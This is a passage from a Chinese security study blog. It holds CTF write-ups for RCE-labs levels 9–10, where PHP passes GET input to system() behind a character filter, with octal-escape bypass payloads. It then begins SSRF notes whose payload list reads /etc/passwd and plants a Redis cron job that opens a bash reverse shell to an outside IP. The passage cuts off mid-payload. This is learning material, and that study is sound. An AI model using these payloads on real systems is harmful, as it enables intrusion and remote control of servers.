<td><code>&lt;</code></td>
<td><code>wc -l &lt; file.txt</code></td>
<td>将 <code>file.txt</code> 作为 <code>wc</code> 命令的输入</td>
</tr>
<tr>
<td><code>&gt;&gt;</code></td>
<td><code>echo &quot;World&quot; &gt;&gt; file.txt</code></td>
<td>将 <code>echo</code> 的输出以追加方式重定向到 <code>file.txt</code></td>
</tr>
<tr>
<td><code>&lt;&lt;</code></td>
<td><code>cat &lt;&lt; EOF</code></td>
<td>将输入的文本作为 <code>cat</code> 命令的输入，直到遇到 <code>EOF</code> 结束</td>
</tr>
<tr>
<td><code>&lt;&gt;</code></td>
<td><code>cat &lt;&gt; file.txt</code></td>
<td>以读写模式打开 <code>file.txt</code> 并将其内容作为输入</td>
</tr>
<tr>
<td>&#96;&gt;</td>
<td>&#96;</td>
<td>&#96;echo “Override” &gt;</td>
</tr>
<tr>
<td><code>: &gt;</code></td>
<td><code>: &gt; file.txt</code></td>
<td>将 <code>file.txt</code> 截断为0长度，或创建空文件</td>
</tr>
<tr>
<td><code>&gt;&amp;n</code></td>
<td><code>ls &gt;&amp;2</code></td>
<td>将 <code>ls</code> 的标准输出和错误输出重定向到文件描述符 <code>n</code> (如 <code>2</code> 为标准错误输出)</td>
</tr>
<tr>
<td><code>m&gt;&amp;n</code></td>
<td><code>exec 3&gt;&amp;1</code></td>
<td>将文件描述符 <code>3</code> 重定向到描述符 <code>1</code>，即输出重定向到标准输出</td>
</tr>
<tr>
<td><code>&gt;&amp;-</code></td>
<td><code>exec &gt;&amp;-</code></td>
<td>关闭标准输出</td>
</tr>
<tr>
<td><code>&lt;&amp;n</code></td>
<td><code>exec &lt;&amp;0</code></td>
<td>输入来自文件描述符 <code>0</code> (标准输入)</td>
</tr>
<tr>
<td><code>m&lt;&amp;n</code></td>
<td><code>exec 3&lt;&amp;0</code></td>
<td>将文件描述符 <code>3</code> 重定向到描述符 <code>0</code> (标准输入)</td>
</tr>
<tr>
<td><code>&lt;&amp;-</code></td>
<td><code>exec &lt;&amp;-</code></td>
<td>关闭标准输入文件描述符</td>
</tr>
<tr>
<td><code>&lt;&amp;n-</code></td>
<td><code>exec &lt;&amp;0-</code></td>
<td>重定向并关闭文件描述符 <code>n</code> (标准输入)</td>
</tr>
<tr>
<td><code>&gt;&amp;n-</code></td>
<td><code>exec &gt;&amp;1-</code></td>
<td>重定向并关闭文件描述符 <code>n</code> (标准输出)</td>
</tr>
</tbody></table>
<h3 id="RCE-labs-level9-无字母-（八进制）"><a href="#RCE-labs-level9-无字母-（八进制）" class="headerlink" title="RCE-labs-level9 无字母 （八进制）"></a>RCE-labs-level9 无字母 （八进制）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_八进制转义 ---</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck</span></span><br><span class="line"><span class="comment">你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/</span></span><br><span class="line"><span class="comment">题目本身也提供一个/exp.php方便你使用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">从该关卡开始你会发现我们在Dockerfile中添加了一行改动：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">RUN ln -sf /bin/bash /bin/sh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这是由于在PHP中，system是执行sh的，sh通常只是一个软连接，并不是真的有一个shell叫sh。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash，我们用的底层镜像 php:7.3-fpm-alpine 默认指向的 /bin/busybox ，要验证这一点，你可以对 /bin/sh 使用 ls -l 命令查看，在这个容器中，你会得到下面的回显：</span></span><br><span class="line"><span class="comment">bash-5.1# ls -l /bin/sh</span></span><br><span class="line"><span class="comment">lrwxrwxrwx    1 root     root            12 Mar 16  2022 /bin/sh -&gt; /bin/busybox</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">我们需要用到的特性只有bash才支持，请记住这一点，这也是我们手动修改指向的原因。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">在这个关卡主要利用的是在终端中，$&#x27;\xxx&#x27;可以将八进制ascii码解析为字符，仅基于这个特性，我们可以将传入的命令的每一个字符转换为$&#x27;\xxx\xxx\xxx\xxx&#x27;的形式，但是注意，这种方式在没有空格的情况下无法执行带参数的命令。</span></span><br><span class="line"><span class="comment">比如&quot;ls -l&quot;也就是$&#x27;\154\163\40\55\154&#x27; 只能拆分为$&#x27;\154\163&#x27; 空格 $&#x27;\55\154&#x27;三部分。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bash-5.1# $&#x27;\154\163\40\55\154&#x27;</span></span><br><span class="line"><span class="comment">bash: ls -l: command not found</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bash-5.1# $&#x27;\154\163&#x27; $&#x27;\55\154&#x27;</span></span><br><span class="line"><span class="comment">total 4</span></span><br><span class="line"><span class="comment">-rw-r--r--    1 www-data www-data       829 Aug 14 19:39 index.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z\&quot;%*+,-.\/:;=&gt;?@[\]^`|]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>payload</strong>：<code>/?cmd=$&#39;\143\141\164&#39; $&#39;\57\146\154\141\147&#39;</code></p>
<h3 id="RCE-labs-level10"><a href="#RCE-labs-level10" class="headerlink" title="RCE-labs-level10"></a>RCE-labs-level10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_二进制整数替换 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck</span></span><br><span class="line"><span class="comment">你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/</span></span><br><span class="line"><span class="comment">题目本身也提供一个/exp.php方便你使用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">本关卡的考点为终端中支持 $((2#binary)) 解析二进制数据。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z2-9\&quot;%*+,-.\/:;=&gt;?@[\]^`|]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只有01可用。</p>
<h3 id="RCE-labs-level11"><a href="#RCE-labs-level11" class="headerlink" title="RCE-labs-level11"></a>RCE-labs-level11</h3><h3 id="RCE-labs-level12"><a href="#RCE-labs-level12" class="headerlink" title="RCE-labs-level12"></a>RCE-labs-level12</h3><h3 id="RCE-labs-level13"><a href="#RCE-labs-level13" class="headerlink" title="RCE-labs-level13"></a>RCE-labs-level13</h3><h3 id="RCE-labs-level14"><a href="#RCE-labs-level14" class="headerlink" title="RCE-labs-level14"></a>RCE-labs-level14</h3><p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Y0uhe/p/15369989.html">CTF中常见RCE命令执行绕过技巧 - LinkPoc - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/393156.html">CTF中的RCE - FreeBuf网络安全行业门户</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">SSRF学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-15 21:03:09" itemprop="dateCreated datePublished" datetime="2025-04-15T21:03:09+08:00">2025-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-16 23:58:33" itemprop="dateModified" datetime="2025-04-16T23:58:33+08:00">2025-04-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">基础知识搭建</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>15 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SSRF-Server-Side-Request-Forgery-概述"><a href="#SSRF-Server-Side-Request-Forgery-概述" class="headerlink" title="SSRF(Server-Side Request Forgery)概述"></a>SSRF(Server-Side Request Forgery)概述</h1><p>[TOC]</p>
<p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong>,字面意思来理解就是：攻击者通过一些手段来达到伪装了一个由服务端对服务器所在内网发起的恶意请求。</p>
<p>也因此，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<h2 id="形成原理及危害"><a href="#形成原理及危害" class="headerlink" title="形成原理及危害"></a>形成原理及危害</h2><p>大多是因为服务端提供了可以从其他服务器获取数据的功能，但没有加以过滤和限制，导致了攻击者可以轻易的任意读取文件，进行内网渗透，对内网Web应用进行攻击等恶意操作。</p>
<p><strong>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</strong></p>
<ol>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>
<li>攻击运行在内网或本地的应用程序（比如溢出）</li>
<li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li>
<li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li>
<li>利用 <code>file</code> 协议读取本地文件等</li>
</ol>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="PHP中一些关键函数"><a href="#PHP中一些关键函数" class="headerlink" title="PHP中一些关键函数"></a>PHP中一些关键函数</h3><p>file_get_contents() &#x2F;&#x2F; 将整个文件读入一个字符串 </p>
<p>file_get_contents(path,include_path,context,start,max_length)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>$filename</code></td>
<td>文件路径或 URL（启用 <code>allow_url_fopen</code> 时）</td>
</tr>
<tr>
<td><code>$use_include_path</code></td>
<td>是否在 include_path 中查找文件</td>
</tr>
<tr>
<td><code>$context</code></td>
<td><code>stream_context</code> 上下文，适用于 HTTP 配置、超时等</td>
</tr>
<tr>
<td><code>$offset</code></td>
<td>从文件的第几字节开始读取</td>
</tr>
<tr>
<td><code>$length</code></td>
<td>最多读取多少字节内容</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">curl_exec</span>() <span class="comment">// </span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">curl_exec</span> ( resource <span class="variable">$ch</span> )</span><br><span class="line">    </span><br><span class="line"><span class="comment">//示例用法</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;https://example.com&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$response</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;响应：&quot;</span> . <span class="variable">$response</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>$ch</code></td>
<td>resource</td>
<td>使用 <code>curl_init()</code> 初始化后的 cURL 会话句柄</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fsockopen</span>() <span class="comment">// 打开 Internet 或者 Unix 套接字 链接</span></span><br><span class="line"></span><br><span class="line">resource|<span class="literal">false</span> <span class="title function_ invoke__">fsockopen</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$hostname</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$port</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$error_code</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">string</span> &amp;<span class="variable">$error_message</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">float</span> <span class="variable">$timeout</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_socket_timeout&quot;</span>)</span><br><span class="line">)</span><br><span class="line">例：<span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;www.example.com&quot;</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>$hostname</code></td>
<td>string</td>
<td>主机名或 IP 地址。支持协议前缀如 <code>ssl://</code>、<code>tls://</code> 等</td>
</tr>
<tr>
<td><code>$port</code></td>
<td>int</td>
<td>端口号</td>
</tr>
<tr>
<td><code>$error_code</code></td>
<td>int 引用</td>
<td>若连接失败，此变量将存储错误代码</td>
</tr>
<tr>
<td><code>$error_message</code></td>
<td>string 引用</td>
<td>若连接失败，此变量将存储错误信息</td>
</tr>
<tr>
<td><code>$timeout</code></td>
<td>float</td>
<td>连接超时时间，单位为秒</td>
</tr>
</tbody></table>
<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="file-（访问本地文件）"><a href="#file-（访问本地文件）" class="headerlink" title="file:&#x2F;&#x2F;（访问本地文件）"></a>file:&#x2F;&#x2F;（访问本地文件）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">/etc/</span>password  <span class="comment"># file:// 之后可以接任意文件</span></span><br></pre></td></tr></table></figure>

<h4 id="dict-（查询字典服务）"><a href="#dict-（查询字典服务）" class="headerlink" title="dict:&#x2F;&#x2F;（查询字典服务）"></a>dict:&#x2F;&#x2F;（查询字典服务）</h4><p><code>dict://ip/info</code>可获取本地<code>redis</code>服务配置信息。</p>
<p>可以用来测试和写入webshell。</p>
<h4 id="ftp-（访问远程文件资源）"><a href="#ftp-（访问远程文件资源）" class="headerlink" title="ftp:&#x2F;&#x2F;（访问远程文件资源）"></a>ftp:&#x2F;&#x2F;（访问远程文件资源）</h4><h4 id="data-（嵌入数据）"><a href="#data-（嵌入数据）" class="headerlink" title="data:&#x2F;&#x2F;（嵌入数据）"></a>data:&#x2F;&#x2F;（嵌入数据）</h4><p>例如直接嵌套一个Base64加密的照片：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:image/png;base64,0KGgoAAAAFGUIknuNSUhEUg...YGGjnm=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h4><p>常用于反弹shell</p>
<h3 id="Parse-url函数"><a href="#Parse-url函数" class="headerlink" title="Parse_url函数"></a>Parse_url函数</h3><p>这里单独提一下Parse_url这个函数,用于拆分url的各个部分为一个类似字典的东西。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//@后</span><br><span class="line">    [user] =&gt; username			//@前</span><br><span class="line">    [pass] =&gt; password			//@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br><span class="line">	/path</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://ctf.@127.0.0.1/flag.php?show&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果:</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  [<span class="string">&quot;user&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;ctf.&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/flag.php&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;show&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="常用Payload"><a href="#常用Payload" class="headerlink" title="常用Payload"></a>常用Payload</h3><p>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> -vvv &#x27;dict://<span class="number">127.0.0.1:6379</span>/info&#x27;</span><br><span class="line"></span><br><span class="line"><span class="attribute">curl</span> -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"></span><br><span class="line"><span class="comment"># * 注意: 链接使用单引号，避免$变量问题</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">curl</span> -vvv &#x27;gopher://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">8</span>%<span class="number">0</span>d%<span class="number">0</span>aflushall%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">64</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">103.21.140.84</span>/<span class="number">6789</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span 